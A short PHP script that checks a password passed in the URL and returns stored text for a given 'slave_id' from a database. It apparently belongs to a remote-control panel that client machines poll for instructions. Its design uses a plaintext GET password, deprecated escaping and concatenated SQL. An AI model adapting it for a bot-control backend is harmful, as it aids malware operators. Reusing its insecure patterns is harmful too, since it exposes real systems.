<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
//-------------------------------------------
if(isset($_GET['client']))
{
$passwords = $_GET['password'];
if($passwords == $passwordc) 
{
$slave_id = $_GET['id'];
$slave_id = mysql_escape_string($slave_id);
//--------------------------------------
$querry_secs = "SELECT text FROM data WHERE slave_id='$slave_id'";
$result4 = mysql_query($querry_secs, $connect);
while($row = mysql_fetch_array($result4) ){
 $data = $row[0];
}
echo $data;
}
}
?>